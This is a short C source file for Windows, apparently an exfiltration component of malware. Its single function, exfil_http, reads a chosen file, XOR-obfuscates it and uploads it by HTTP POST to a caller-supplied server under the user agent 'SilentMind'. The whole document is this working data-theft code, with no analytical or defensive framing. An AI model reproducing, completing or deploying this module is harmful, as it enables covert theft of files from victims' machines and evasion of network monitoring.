#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

extern void xor_encrypt(unsigned char *data, int len, const char *key);

int exfil_http(const char *filename, const char *server, int port, const char *key) {
    FILE *fp = fopen(filename, "rb");
    if (!fp) return -1;

    fseek(fp, 0, SEEK_END);
    int size = ftell(fp);
    rewind(fp);

    unsigned char *buffer = (unsigned char*)malloc(size);
    fread(buffer, 1, size, fp);
    fclose(fp);

    xor_encrypt(buffer, size, key);

    HINTERNET hSession = InternetOpen("SilentMind", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnect(hSession, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/upload", NULL, NULL, NULL,
                                         INTERNET_FLAG_RELOAD, 0);

    const char *headers = "Content-Type: application/octet-stream\r\n";
    BOOL result = HttpSendRequest(hRequest, headers, strlen(headers), buffer, size);

    free(buffer);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    return result ? 0 : -5;
}
